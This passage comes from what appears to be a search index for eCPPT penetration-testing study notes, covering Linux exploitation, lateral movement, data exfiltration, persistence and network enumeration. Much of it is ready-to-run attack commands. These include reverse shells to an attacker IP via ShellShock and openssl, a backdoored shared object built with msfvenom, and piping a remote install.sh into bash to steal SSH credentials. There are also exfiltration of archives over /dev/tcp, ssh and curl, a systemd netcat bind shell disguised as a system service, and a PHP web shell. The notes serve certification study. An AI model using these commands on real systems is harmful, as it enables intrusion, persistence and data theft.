./opt/LinEnum/LinEnum.sh\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#exploitation-over-the-network","title":"Exploitation over the Network","text":"<p>Password Spray <pre><code>$ hydra -L users.txt -P password.txt ssh://$IP\n\n$ hydra -l admin -p Spring2023 -M ssh_servers.txt ssh\n\n# Outlook Brute Force\nhttps://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/\n\n# Tool\nhttps://github.com/dafthack/DomainPasswordSpray/tree/master\n\n\n# Common Passwords\nSeason-Year\nSpring2023\n\nCorpName-Number\nFooCorp01\nFooCorp02\n</code></pre></p> <p>Exploiting Samba <pre><code># Samba Version Discovery\n$ nmap --script smb-os-discovery -p445 &lt;Target_IP&gt;\n\n\n# Idenfity Vulnerabilities affected on Samba Version\n$ searchsploit samba 3.0.20\n\n\n\n# Exploit CVE-2007-2447 - Samba 3.0.20\nmsf &gt; use exploit/multi/samba/usermap_script\n\n# PTY Shell\n$ python -c \"import pty;pty.spawn('/bin/sh')\"\n\n\n\n# Exploit Samba Symlink Directory Traversal Vulnerability\n$ smbmap -H &lt;IP_Address&gt;       # Search Writeable Share\nmsf &gt; use auxiliary/admin/smb/samba_symlink_traversal\n\n$ smbclient \\\\\\\\$IP\\\\$Share -N     # SMB Shell\nsmb:\\&gt; tar c /tmp/all_files.tar    # Make Archieve \n\n$ tar -xf all_files.tar            # Extract Archieve\n$ grep -r \"password\" * 2&gt;/&amp;1  /dev/null  # Search Sensitive Keywords\n\n\n\n\n# Writable Samba Server RCE via Perl - Full Patched\n# Perl WebShell, upload to \"www\" share where HTTP server files are.\n$ /usr/share/webshells/perl/\n$ nc -nlvp &lt;PORT&gt;\n</code></pre></p> <p>Exploiting ShellShock <pre><code># https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6271\n\n# Test on Local System if target is vulnerable\n$ env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\"\n\n----------------------------------------------------------------------\n\n# CGI Exploit - ShellShock\n\n# Find CGI files on cgi-bin Directory\n.\\dirsearch.py -u &lt;Target&gt; -e cgi -r \n\n# Nmap script to check if target is vulnerable\n$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi  &lt;target&gt;\n\n# Nmap script to Execute Commands on target\n$ nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi,cmd=ls &lt;target&gt;\n\n# Wget script to Execute Commands on target\n$ nc -nlvp &lt;Port&gt;\n$ wget -U \"() { foo;};echo; /bin/nc &lt;Attacker_IP&gt; &lt;Port&gt; -e /bin/sh\" http://&lt;Target_IP&gt;/cgi-bin/login.cgi \n</code></pre></p> <p>Exploiting Heartbleed <pre><code># Check if Target is VUlnerable\n$ nmap --script ssl-heartbleed &lt;target&gt;\n\n# Exploit Heartbleed\nmsf &gt; use auxiliary/scanner/ssl/openssl_heartbleed\nmsf &gt; show actions\nmsf &gt; SET action DUMP\nmsf &gt; exploit\n\n\nNOTE : If sensitive data does not leaked, run few more times. Different contents will appear at different time \n</code></pre></p> <p>Exploiting Java RMI Registry <pre><code># Port Check\n$nmap -sT -sV &lt;Target&gt; -p1099\n\n\n# Exploit \nmsf &gt; use exploit/multi/misc/java_rmi_server\n\n\n\n\nNOTE : Many IDS flag metasploit SSL certificates so use custom SSL certificate.\n\nNOTE : Port may be different.\n</code></pre></p> <p>Exploiting Java Deserialization <pre><code># https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\n</code></pre></p> <p>Exploiting Tomcat <pre><code># Login Brute Force\nmsf &gt; use auxiliary/scanner/http/tomcat_mgr_login\n\n# Laudanum - Malicious war file.\n$ /usr/share/laudanum/jsp/cmd.war\n\nHTTP &gt; http://&lt;IP_Address&gt;/cmd/cmd.jsp  \n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#post-exploitation","title":"Post Exploitation","text":""},{"location":"eCPPT%20Materials/Linux%20Exploitation/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code># Netcat File Transfer\n$ nc -l -p 1234 &gt; Linenum.sh             # Victim \n$ nc -w 3 &lt;Target_IP&gt; 1234 &lt; Linenum.sh  # Attacker\n</code></pre> <p>Cleartext Credentials in Confuguration FIles <pre><code># Linenum\n$ chmod +X Linenum.sh\n$ ./Linenum.sh\n\n$ ./Linenum.sh -k {Keyword}\n\n----------------------------------------------------------------------\n\n# Search \"Password\" Keyword on .conf files\n$ grep -r password /etc/*.conf 2&gt;/dev/null\n\n\n----------------------------------------------------------------------\n# Metasploit Modules\nmsf &gt; use post/linux/gather/enum_configs\nmsf &gt; use post/linux/gather/enum_system\nmsf &gt; use post/linux [TAB]\n</code></pre></p> <p>SUID Binaries <pre><code># Search For All SUID Executables\n$ find / -perm -4000 -type f 2&gt;/dev/null\n\n----------------------------------------------------------------------\n\n\n# glibc $ORIGIN Expansion Privilege Escalation\nmsf &gt; use exploit/linux/local/glibc_origin_expansion_priv_esc\n</code></pre></p> <p>Sudo Privileged Access <pre><code># Exploits\nhttps://gtfobins.github.io/\n\n\n\n# Sudoers file\n/etc/sudoers\n\n\n# Sudo Commands\n$ Sudo -l\n\n\n# Sudo - Docker Command Privilege Escalation\nhttps://github.com/pyperanger/dockerevil\n</code></pre></p> <p>Restricted Shells <pre><code># Check Restricted Shell on System\n$ $ENV\n\n----------------------------------------------------------------------\n\n# Restricted Shell Escape With Vi/VIM\n$ vim /tmp/test\n&gt; :!sh\n\n----------------------------------------------------------------------\n\n\n# Restricted Shell Escape With Find\n$ find /home/bob -name test -exec /bin/sh \\;\n\n----------------------------------------------------------------------\n\n\n# Restricted Shell Escape With Python/Perl\n$ python -c 'import pty; pty.spawn(\"/bin/sh\")'     # Python\n$ perl -e 'exec \"/bin/sh\";'                        # Perl\n\n----------------------------------------------------------------------\n\n# Restricted Shell Escape With SSH\n$ ssh restricted_user@targerserver -t \"/bin/sh\"\n</code></pre></p> <p>Cracking The Shadow <pre><code># Unshudow Command\n$ unshudow /etc/passwd /etc/shadow &gt; shadow.john\n\n# Crack with John\n$ john shadow.john --wordlist=rockyou.txt \n\n----------------------------------------------------------------------\n\n# Dump Passwords From Memory - Mimipenguin\n$ ./mimipenguin.sh\n$ ./mimipenguin.py\n</code></pre></p> <p>Pilfering Credentials From Swap Memory <pre><code># Check Swap Partition \n$ swapon -s\n$ cat /proc/swaps\n\n\n# Dump Sensitive Info From Swap Partition \n$ strings /dev/sda5 | grep \"password\"\n\n\n# Automation\nhttps://github.com/sevagas/swap_digger\n</code></pre></p> <p>Code Execution via Shared Object Library Loading <pre><code>1. Determine the shared object that are being loaded by an executable\n2. Determine if the application was compiled with RPATH or RUNPATH options. If Yes, can we write into the locations specified by the either of those options ?\n\n\n# Determine the shared object that are being loaded by an executable\n$ ldd &lt;Executable_Program&gt;\n\n$ ldd /usr/local/bin/program\noutput &gt; program.so =&gt; /usr/lib/program/program.so\n\n# Determine if the Executable was Compiled with RPATH or RUNPATH\n$ objdump -x /usr/local/bin/program | grep RPATH\n$ objdump -x /usr/local/bin/program | grep RUNPATH\noutput &gt; RPATH   /tmp/program/libs         # Writable Directory\n\n\n# Generate Backdoored Shared Object\n$ msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;Attacker_IP&gt; LPORT=&lt;Attacker_PORT&gt; -f elf-so -o program.so\n\n# Metasploit Listener\nmsf &gt; use exploit/multi/handler\nmsf &gt; set payload linux/x64/shell_reverse_tcp\nmsf &gt; exploit\n\n# Transfer Backdoored Shared Object to the Target Machine\n$ python3 -m http.server                                   # Attacker\n$ cd /tmp/program/libs &amp;&amp; wget [Attacker_IP]/program.so    # Victim\n</code></pre></p> <p>Kernel Exploits <pre><code># Search Debian Based Linux Kernel Exploits\n$ searchsploit \"linux kernel debian\"\n\n\n# Finding the Right Kernel Exploit\n$ perl Linux_Exploit_Suggester.pl\n$ perl Linux_Exploit_Suggester.pl &lt;Kernel_Version&gt;\n\n\n# Compiling Exploit Code\n$ gcc exploit.c -o exploit\n$ chmod +x exploit\n$ ./exploit\n\n# Compile as 32 Bit\n$ gcc -m32 exploit.c -o exploit\n\n\nReference:\nhttps://github.com/InteliSecureLabs/Linux_Exploit_Suggester\n\nhttps://github.com/lucyoa/kernel-exploits\nhttps://github.com/SecWiki/linux-kernel-exploits\n</code></pre></p> <p>Socket Exploitation <pre><code># Privilege Esclataion With User Which is in Docker Group\n$ docker run -v /etc/shadow:/docker/hashedpasswords -d postgres\n$ docker exec -ti [CONTAINER_ID] bash\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#lateral-movement","title":"Lateral Movement","text":"<p>SSH Hijacking <pre><code># Determine the SSH process ID\n$ ps aux | grep sshd\n\n# Find the SSH_AUTH_SOCK environment variable for the sshd\n$ grep SSH_AUTH_SOCK /proc//environ\n\n# Hijack the ssh-agent socket\n$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add \u2013l\n\n# Log into the remote system our victim is logged into\n$ ssh remotesystem -l victim\n\n\nNOTE : In order for this method to be succesful, the compromised machine should have an anctive SSH session estabilished to another machine via Public Key Authentication\n\nReference: \nhttps://kwcsec.gitbook.io/the-red-team-handbook/techniques/lateral-movement/linux/ssh-hijacking\n</code></pre></p> <p>Stealing SSH Credentials <pre><code># https://github.com/mthbernardes/sshLooter\n\n\n$ git clone https://github.com/mthbernardes/sshLooter.git  # Attacker\n$ curl http://yourserverip:8000/install.sh | bash          # Victim\n\n\nReferenfe :\nhttps://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==\n</code></pre></p> <p>Samba Secrets <pre><code># Samba 4.7.4 - secrets.tdb dump\n$ tdbdump /var/lib/samba/private/secrets.tdb\n\n\n\nReference :\nhttps://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9\n</code></pre></p> <p>VPN Pivot <pre><code># https://github.com/0x36/VPNPivot\n\nroot@pwnies:~# git clone https://github.com/0x36/VPNPivot.git\nroot@pwnies:~# cd VPNPivot\nroot@pwnies:~/VPNPivot# ./autogen.sh\nroot@pwnies:~/VPNPivot# ./configure\nroot@pwnies:~/VPNPivot# make &amp;&amp; make install\nroot@pwnies:~/VPNPivot# ./src/pivots -h\n\n\nReference :\nhttps://www.youtube.com/watch?v=VauxUK3OZnQ\n</code></pre></p> <p>Dumping Stored Firefox Credentials <pre><code># https://github.com/unode/firefox_decrypt/tree/main\n\n$ python firefox_decrypt.py\n</code></pre></p> <p>**Dump sshd and sudo Credential Related Strings ** <pre><code># https://github.com/blendin/3snake\n\n$ git clone https://github.com/blendin/3snake.git\n$ make\n$ ./3snake -h\n$ ./3snake\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code># Exfil over TCP Socket with EBCDIC and Base64\n\n# Step 1 - Netcat Listener on Attacker Machine\n$ nc nlvp 80 &gt; datafolder.tmp                    \n\n# Step 2 - Encode Data with Base64/EBCDIC on Victim And Sen Over TCP\n$ tar zcf - /tmp/datatolder | base64 | dd conv=ebcdic &gt; /dev/tcp/&lt;attacker_IP&gt;/80        \n\n# Step 3 - Decode Recieved File on Attacker Machine\n$ dd conv=ascii if=datafolder.tmp | base64 -d &gt; datafolder.tar\n\n# Step 4 - Extract Tar Archieve\n$ tar xvf datafolder.tar\n\n\n\n----------------------------------------------------------------------\n\n\n# Exfil over SSH\n\n# Step 1 - Send Data over SSH\n$ tar -zcf - /tmp/datafolder | ssh root@&lt;attacker_IP&gt; \"cd /tmp; tar zxpf -\"\n\n# Step 2 - On Attacker Host Data is Already untar'd\n\n\nNOTE : For extra stealthiness, configure SSH server on port 80 for instance\n\n\n----------------------------------------------------------------------\n\n# Exfil via POST Request over HTTPS\n\n# Step 1 - On attacker Server, Create PHP File That Recieve Data\n&lt;?php file_put_contents('/tmo/datafolder.base64', file_get_contents('php://input')); ?&gt;\n\n# Step 2 - Send Data over HTTPS via Curl\n$ curl --data \"$(tar zcf - /tmp/datafolder | base64)\" https://&lt;attacker_IP&gt;/contanct.php\n\n# Step 3 - Decode Recieved File on Attacker Machine\n$ cat /tmo/datafolder.base64 | base64 -d &gt; datafolder.tar &amp;&amp; tar xf datafolder.tar\n\n\n----------------------------------------------------------------------\n\n\nReference : \nhttps://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/\n</code></pre>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#maintaining-access","title":"Maintaining Access","text":"<p>OpenSSL Reverse Shell <pre><code># Generate SSL Certificate Key Pair\n$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n# Start OpenSSL Listener with Generated SSL Kay Pair\n$ openssl s_server -quit -key key.pem -cert cert.pem -port 443\n\n# mkfifo named pipe Reverse Shell - Victim Machine\n$ mkfifo /tmp/x; /bin/sh -i &lt; /tmp/x 2&gt;&amp;1 | openssl s_client -quit -connect &lt;attacker_IP&gt;:443 &gt; /tmp/x; rm /tmp/x\n</code></pre></p> <p>ICMP Reverse Shell <pre><code># https://github.com/bdamele/icmpsh\n\n# https://book.hacktricks.xyz/c2/icmpsh\n</code></pre></p> <p>Backdoors <pre><code># Xinetd UDP Portknock Backdoor\n\n# Create Custom xinetd Service on Victim Machine. Run Following Script\n&gt;  https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56\n\n# Start Netcat Listener on Attacker Machine\n$ nc -nlvp 4444\n\n# Send Single UDP packet on xinetd Service to Get Reverse Shell\n$ hping3 -2 -c 1 &lt;target IP&gt; -p 65534\n\n\n----------------------------------------------------------------------\n\n# Systemd Netcat Bind Shell\n\n# Step 1 - Copy nc Executable to /lib/systemd Directory\n$ cp /bin/nc /lib/systemd/systemd-service\n\n# Step 2 - Create File /lib/systemd/system/systemd.service With Following Content\n[Unit]\nDescription = Systemd Service\nAfter = network.target\n[Service]\nExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh\n[install]\nWantedBy = multi-user.target\n\n\n# Step 3 - Enable Systemd Netcat Bind Shell Service\n$ systemctl enable systemd.service\n$ systemctl start systemd.service\n\n\n# Step 4 - Confirm that Port for Custom Service is Listening\n$ netstat -auntp | grep 56825\n\n\n# Step 5 - Initiate Connection and Get Reverse Shell\n$ nc &lt;target_IP&gt; 56825\n</code></pre></p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/#labs","title":"Labs","text":"<p>Linux Exploitation: Lab 3 - Remote Exploitation and Post Exploitation <pre><code># Exploit demo.ine.local - Port 80 egallery\n$ searchsploit EGallery\nmsf &gt; use exploit/unix/webapp/egallery_upload_exec\nmsf &gt; set targeturi /\nmsf &gt; exploit\n\n\n# demo.ine.local - Privilege Escalation - Exim smtpd 4.89\nmsf &gt; use exploit/linux/local/exim4_deliver_message_priv_esc\nmsf &gt; set payload linux/x86/meterpreter/reverse_tcp\nmsf &gt; exploit\n\n\n# Pivoting\nmeterpreter &gt; run autoroute -s 192.161.244.0/24\nmeterpreter &gt; background\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; exploit\nmsf &gt; jobs\n\n\n# Port Scan on Pivoting Network\n$ proxychains nmap -sT -Pn -n 192.161.244.3-5 --top-ports 50\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n\n\n# Scan Pivoted Machine (192.161.244.3) for ShellShock - cgi-bin/stats\n$ proxychains nmap sT -Pn -n -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/stats 192.161.244.3\n\n\n# Exploit Port 80 on Pivoted Machine - cgi-bin shellshock\nmsf &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec\nmsf &gt; set targeturi /cgi-bin/stat\nmsf &gt; set PAYLOAD linux/x86/meterpreter/bind_tcp\nmsf &gt; exploit\n</code></pre></p> <p>Linux Exploitation: Lab 4 - Lateral Movement <pre><code># Nmap Scan - Port 79 - demo.ine.local\n$ nmap -sS -sV demo.ine.local\n\n\n# Enumerate Users with Port 79 ( Finger )\n$ for i in `cat /usr/share/metasploit-framework/data/wordlists/common_users.txt`; do finger $i@demo.ine.local; done | grep Login:\n\n\n# Brute Force Enumerated User Through SSH\n$ hydra -l sysadmin -p /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt demo.ine.local ssh\n\n\n# Login with SSH, Enumerate Local Ports and Forward Them\n$ ssh sysadmin@demo.ine.local\n$ netstat -auntp\n$ ssh -L 3306:127.0.0.1:3306 sysadmin@demo.ine.local\n\n\n# Brute Force Forwarded MySQL Port\nmsf &gt; auxiliary/scanner/mysql/mysql_login\nmsf &gt; set RHOST 127.0.0.1\nmsf &gt; set PASS_FILE /usr/share/metasploit-framework/data/wordlist/unix_password.txt\nmsf &gt; set USERNAME root\nmsf &gt; run\n\n\n# Privilege Escalation - Enumerate Local MySQL port - Library is running with root privileges\n$ ps aux | grep mysql\nmsf &gt; use exploit/multi/mysql/mysql_udf_payload\nmsf &gt; set RHOST 127.0.0.1\nmsf &gt; set TARGET Linux\nmsf &gt; exploit\n\n\n# Enumerate .bash_history file on users home folder - mysql Credentials on 192.3.178.3 \n$ cat /home/auditor/.bash-history\n\n\n# Pivoting\nmeterpreter &gt; run autoroute -s 192.3.178.0/24\nmeterpreter &gt; background\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; exploit\nmsf &gt; jobs\n\n\n# Port Scan on Pivoting Network\n$ proxychains nmap -sT -Pn -n 192.3.178.1-5 --top-ports 50\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n\n\n# Scan Pivoted Machine 192.161.244.3 and Forward Ports on Local Machine\n$ proxychains nmap -sT -Pn -n 192.161.244.3 -sV\n$ ssh -L 3306:192.161.244.3:3306 -L 80:192.161.244.3:80 sysadmin@demo.ine.local\n\n\n# Enumerate port 80 - WebTemp Directory is found\n$ Dirsearch -u http://127.0.0.1\n\n\n# Upload file to WebTemp Directory Through MySQL\n$ mysql -h 192.161.224.3 -u root -p{Password Found on .bash_history file}\nmysql &gt; select 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE '/var/www/html/webtemp/exploit.php'\n\n\n# Get FLAG with Reverse Shell\n$ curl http://127.0.0.1/webtemp/exploit.php?cmd=id\n$ curl http://127.0.0.1/webtemp/exploit.php?cmd=cat ../FLAG2\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/","title":"Network Security","text":""},{"location":"eCPPT%20Materials/Network%20Security/#information-gathering","title":"Information Gathering","text":""},{"location":"eCPPT%20Materials/Network%20Security/#search-engines","title":"Search Engines","text":"<p>Google Dork : <pre><code>site:[website] filetype:[filetype]\n</code></pre></p> <pre><code>cache:[URL]\n</code></pre> <p>theHarvester : <pre><code>theharvester -d  domain.com -l 100 -b google\n</code></pre> - -d is the domain - -l limits the results to the value specified - -b data source</p> <p>Interesting Tools : - DNSdumpster - Shodan - Exploits Shodan - FOCA - Maltego</p>"},{"location":"eCPPT%20Materials/Network%20Security/#dns-enumeration","title":"DNS Enumeration","text":"<p>Whois : <pre><code>whois domain.com\n</code></pre></p> <p>IP Resolve : <pre><code>dig domain.com\n</code></pre> <pre><code>nslookup domain.com\n</code></pre></p> <p>Nameserver lookup : <pre><code>dig domain.com NS\n</code></pre> <pre><code>nslookup -type=NS domain.com\n</code></pre></p> <p>Reverse DNS lookup : <pre><code>dig domain.com PTR\ndig axfr -x 192.168 @DNS_IP \n</code></pre> <pre><code>nslookup -type=PTR domain.com\n</code></pre></p> <p>Mail Exchange lookup : <pre><code>dig domain.com MX\n</code></pre> <pre><code>nslookup -type=MX domain.com\n</code></pre></p> <p>Zone transfers : <pre><code>dig axfr @DNS_IP domain.com +nocookie\n</code></pre> <pre><code>nslookup\n&gt; server [nameserver for domain.com]\n&gt; 1s -d domain.com\n</code></pre></p> <p>DNS Tools : <pre><code>fierce --domain domain.com \n</code></pre> <pre><code>fierce --domain domain.com --dns-servers {IP}\n</code></pre></p> <p><pre><code>dnsenum domain.com\n</code></pre> <pre><code>dnsenum domain.com --dnsserver {DNS IP}\n</code></pre> <pre><code>dnsenum domain.com -f {subdomain file}\n</code></pre></p> <p><pre><code>dnsmap domain.com\n</code></pre> <pre><code>dnsmap domain.com -w {subdomain file}\n</code></pre></p> <p><pre><code>dnsrecon -d domain.com\n</code></pre> <pre><code>dnsrecon -d domain.com -n {NS IP}\n</code></pre> <pre><code>dnsrecon -d domain.com -{scan option}\n</code></pre></p> <p>Labs <pre><code># Scan - Check opened DNS port\n$ nmap -sS -p53 witrap.com\n\n\n# How many A Records are present for witrap.com and its subdomains?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# What is the machine's IP address that supports LDAP over TCP on witrap.com ?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# Can you find the secret flag in the TXT record of a subdomain of witrap.com?\n$ dig axfr witrap.com @192.199.31.3\n\n\n# What is the subdomain for which only reverse dns entry exists for witrap.com? witrap owns the IP address range: 192.168..\n$ dig axfr -x 192.168 @192.199.31.3\n\n\n# How many records are present in the reverse zone for witrap.com (excluding SOA)? witrap owns the IP address range: 192.168..\n$ dig axfr -x 192.168 @192.199.31.3\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#scanning","title":"Scanning","text":""},{"location":"eCPPT%20Materials/Network%20Security/#host-discovery","title":"Host discovery","text":"<p><pre><code>fping -asgq 192.168.1.0/24\n</code></pre> <pre><code>nmap -sn 192.168.1.0/24\n</code></pre> <pre><code>hping3 -1 192.168.1.x --rand-dest -I eth0\n</code></pre></p> <p><pre><code>nmap -sS -p53 [NETBLOCK]\n</code></pre> <pre><code>nmap -sU -p53 [NETBLOCK]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#scanning-techniques","title":"Scanning techniques","text":"<pre><code>nmap -sS target                         # SYN scan\nnmap -sA target                         # ACK scan\nnmap -sF target                         # FIN scan\nnmap -sN target                         # Null scan\nnmap -sO target                         # IP Protocol scan\nnmap -sX target                         # XMAS scan\n\nhping3 -S target -c 1                         # SYN scan\nhping3 -A target -c 1                         # ACK scan\nhping3 -F target -c 1                         # FIN scan\nhping3 -F -P -U target -c 1                   # XMAS scan\n</code></pre> <p>Idle/Zombie scan <pre><code>nmap -O -v -n targetZombie\nnmap --script ipidsec targetZombie\nnmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v\n</code></pre></p> <pre><code>hping3 -S -r -p [port] [targetZombie]\nhping3 -a [targetZombie] -S -p [port] [target]\n</code></pre> <p>FTP bounce scan : <pre><code>nmap -Pn -b [ftpvulnerable] [target]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#service-and-os-detection","title":"Service and OS detection","text":"<pre><code>nc [targetIP]:[Port]                      # Banner Grabbing\nnmap -sV target                           # Version Scan\nnmap -sV -sC target                       # Version/Script Scan\nnmap -O target                            # OS Detection\nnmap -A target                            # Version/Script/OS/Traceroute Scan\n</code></pre> <pre><code>./p0f -i [interface]\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#firewallids-evasion","title":"Firewall/IDS Evasion","text":"<p>Fragmentation  <pre><code>nmap -sS -f [target]\nnmap -sS -f --data-lenght 100 [target]\n</code></pre></p> <p>Decoy  <pre><code>nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]\nnmap -sS -D RND:10 [target]\n</code></pre></p> <p>Source ports <pre><code>nmap -sS --source-port [source port] [target]\nhping3 -S -s [source port] [target]\n</code></pre></p> <p>Packet header  <pre><code>nmap -sS --data-lenght 10 [target]\nhping3 -S --data 24 [target] -p [port]\n</code></pre></p> <p>Mac address spoofing <pre><code>nmap -sS --spoof-mac [mac] [target]\n</code></pre></p> <p>Timing <pre><code>nmap -iL [hosts.txt] -sS -T [Timing option]\n\n0 - 5 min\n1 - 15 sec\n2 - 0.4 sec\n3 - default\n4 - 1 msec\n5 - 5 msec\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#enumeration","title":"Enumeration","text":""},{"location":"eCPPT%20Materials/Network%20Security/#netbios","title":"NetBIOS","text":"<p>NetBIOS enumeration from Windows <pre><code>nbtstat -n                                 #NetBIOS names on our machine\n\nnbtstat -A &lt;target_IP&gt;                     #NetBIOS names on target machine\n</code></pre></p> <p>NetBIOS enumeration from Linux <pre><code>nbtscan -v &lt;target_IP&gt;                     #NetBIOS names on target machine\n\nnbtscan -v &lt;target_IP&gt;/24                  #NetBIOS names with subnetmask\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#smb-shared-folder","title":"SMB Shared folder","text":"<p>Resource enumeration from Windows <pre><code>net view &lt;target_IP&gt;                       #List shared resources\n\nnet use K: \\\\{target IP}\\{Share}           #Connect shared resource \n</code></pre></p> <p>BruteForce attempts for shares with Nat10bin <pre><code>nat.exe -u &lt;userlist&gt; -p &lt;passlist&gt; &lt;target_IP&gt;\n</code></pre></p> <p>Resource enumeration from Linux <pre><code>smbclient -N -L &lt;target_IP&gt;                   #List shared resources\n\nmount.cifs //{target_IP}/{Share} /media/myshare/ user=,pass=.   #Mount share\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#null-session","title":"Null Session","text":"<p>Check if system is vulnerable against Null Session <pre><code>net use \\\\&lt;target IP&gt;\\IPC$ \"\" /u:\"\"\n</code></pre></p> <p>Tools to enumerate target through Null Session - Windows</p> <p>Dumpsec <pre><code>1. Click `Report` -&gt; `Select Computer` -&gt; Insert Target IP\n2. Click `Report` -&gt; `Dump Users as column`\n3. After everything is set, click `OK`\n</code></pre> Winfingerprint </p> <p>Winfo <pre><code>winfo &lt;taget_IP&gt; -n\n</code></pre></p> <p>Tools to enumerate target through Null Session - Linux</p> <pre><code>enum4linux &lt;target_IP&gt;\n\nrpcclient -N -U \"\" &lt;target_IP&gt;\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#snmp","title":"SNMP","text":"<p>Script scan <pre><code>nmap -sU -p 161 --script [script_name] [target]\n</code></pre></p> <p>Community string Brute Force <pre><code>nmap -sU -p 161 --script snmp-brute [target]\n</code></pre></p> <p>Community string Brute Force with custom wordlist  <pre><code>nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=&lt;wordlist&gt; [target]\n\nWordlist - /usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt\n</code></pre></p> <p>Enumeration : <pre><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]\n</code></pre></p> <p>Change value of an attribute  <pre><code>snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#pivoting","title":"Pivoting","text":"<pre><code>meterpreter &gt; run autoroute -s 10.10.10.0/24\nmeterpreter &gt; run autoroute -p\n\nbackground\nuse auxiliary/server/socks_proxy\nshow options\nset SVRPORT [9050]\nset VERSION [4a]\nexploit\njobs\n\nbash &gt; proxychains nmap -sT -Pn -sV -p 445 10.10.11.15\n\n# Port Forwarding\nmeterpreter &gt; portfwd add -l 1234 -p 80 -r 10.100.40.107\n\n# Browse through proxy\nproxychains iceweasel\n\n# Communicate through victim2 to victim 1 -  10.10.11.0 and 10.10.10.0\nmeterpreter &gt; run autoroute -s 10.10.10.0/24\nmeterpreter &gt; run autoroute -s 10.10.11.0/24\nmsf &gt; # Set payload with LHOST of victim 1 and then traffic goes between them\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#sniffing-mitm-attacks","title":"Sniffing &amp; MITM Attacks","text":""},{"location":"eCPPT%20Materials/Network%20Security/#arp","title":"ARP","text":"<p>ARP scan <pre><code>arp-scan \n</code></pre></p> <p>Check ARP table : <pre><code>arp -a                               #Windows\n\narp                                  #Linux\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#sniffing-tools","title":"Sniffing Tools","text":"<pre><code>dsniff &lt;options&gt;\n</code></pre> <pre><code>Wireshark\n    http.request.method == \"POST\"\n    htt.authbasic\n</code></pre> <pre><code>Tcpdump &lt;options&gt; &lt;filter expresions&gt; \n    tcpdump -i eth0\n    tcpdump -i eth0 -xxAXXSs 0\n    tcpdump -i eth0 -xxAXXSs 0 dst [testination IP]\n    tcpdump -i eth0 host domain.com\n    tcpdump -i eth0 port 3389\n    tcpdump -i eth0 src [source_IP] and dst [destination_IP]\n    tcpdump -i eth0 -F [filter file]\n    tcpdump -i eth0 -w [output.txt]\n    tcpdump -i eth0 -r [output.txt]\n    tcpdump -i eth0 | grep [?]\n</code></pre> <pre><code>Windump\n</code></pre> <pre><code>driftnet &lt;options&gt;                         # Capture Photos during MITM\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#respondermultirelay","title":"# Responder/Multirelay","text":"<pre><code># Responder Tools - /usr/share/responder/tools/\n# Responder conf file - /usr/share/responder/responder.conf\n\n# Before run multiray attack, disable SMB and HTTP servers on responder.conf\n\npython RunFinger.py -i &lt;target_IP&gt;           # Check if SMB signing is disabled\n\nResponder -I eth0 --lm                       # Run responder\npython3 Multirelay.py -t &lt;target_IP&gt; -u ALL  # NTLM Relay to gain shell\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#mitm-tools","title":"MITM Tools","text":"<p>Ethercap <pre><code># /etc/ettercap/etter.dns                       # Dns Spoofing conf file\n\nettercap -G                                     # Run as Graphical Interface\n    Scan for Host\n    Add to Target 1 / Add to Target 2\n    Sniff Remote Connections\n    View &gt; Connections\n</code></pre></p> <p>Cain &amp; Abel <pre><code>Windows Tool for MITM attack\n\nrefference - 